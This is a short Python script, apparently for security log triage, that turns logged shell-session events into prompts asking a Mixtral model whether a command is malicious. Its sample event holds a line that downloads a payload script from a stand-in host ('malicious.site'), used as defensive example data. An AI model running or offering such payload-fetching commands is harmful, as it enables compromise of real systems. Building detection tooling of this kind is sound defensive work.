import json
from datetime import datetime

def parse_event(event):
    """
    Takes a single event dictionary and returns a cleaned, structured format for prompt generation.
    """
    try:
        timestamp = event.get("timestamp")
        readable_time = datetime.fromisoformat(timestamp.replace("Z", "+00:00")).strftime('%Y-%m-%d %H:%M:%S')
        prompt = {
            "Session ID": event.get("session", "N/A"),
            "Source IP": event.get("src_ip", "N/A"),
            "Time": readable_time,
            "Command": event.get("command", "N/A")
        }
        return prompt
    except Exception as e:
        print(f"[!] Error parsing event: {e}")
        return None

def format_prompt(prompt_data):
    """
    Converts structured prompt data into a Mixtral-compatible prompt string.
    """
    prompt_string = (
        f"Session ID: {prompt_data['Session ID']}\n"
        f"Source IP: {prompt_data['Source IP']}\n"
        f"Time: {prompt_data['Time']}\n"
        f"Command Executed:\n"
        f"  {prompt_data['Command']}\n\n"
        f"Question: Is this behavior malicious? If yes, assign a threat category and risk score."
    )
    return prompt_string

if __name__ == "__main__":
    # Example usage
    sample_event = {
        "timestamp": "2025-07-01T14:32:10Z",
        "src_ip": "192.168.1.88",
        "session": "s001",
        "command": "wget http://malicious.site/payload.sh"
    }

    parsed = parse_event(sample_event)
    if parsed:
        prompt = format_prompt(parsed)
        print("Generated Prompt:\n")
        print(prompt)
